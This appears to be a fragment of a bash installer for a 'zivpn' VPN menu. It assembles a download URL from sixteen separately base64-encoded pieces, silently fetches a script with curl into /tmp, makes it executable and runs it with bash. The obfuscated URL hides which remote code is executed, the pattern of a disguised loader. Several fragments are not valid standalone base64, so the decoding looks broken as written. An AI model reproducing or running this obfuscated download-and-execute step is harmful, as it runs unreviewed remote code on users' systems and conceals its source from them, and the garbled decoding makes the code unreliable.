decode() {
  echo "$1" | base64 -d
}

download_menu_script() {
  p1=$(decode "aHR0cHM6")
  p2=$(decode "Ly9yYXc")
  p3=$(decode "uZ2l0aH")
  p4=$(decode "VidXNl")
  p5=$(decode "cmNvbn")
  p6=$(decode "RlbnQu")
  p7=$(decode "Y29tL2")
  p8=$(decode "hxLW1w")
  p9=$(decode "L3ppLX")
  p10=$(decode "Zw==")
  p11=$(decode "RudC5j")
  p12=$(decode "b20vcm")
  p13=$(decode "Vmcy9o")
  p14=$(decode "ZWFkcy")
  p15=$(decode "9tYWlu")
  p16=$(decode "L21lbnU=")

  full_url="${p1}${p2}${p3}${p4}${p5}${p6}${p7}${p8}${p9}${p10}${p11}${p12}${p13}${p14}${p15}${p16}"
  curl -s "$full_url" -o /tmp/zivpn_menu.sh
  chmod +x /tmp/zivpn_menu.sh
  bash /tmp/zivpn_menu.sh
}
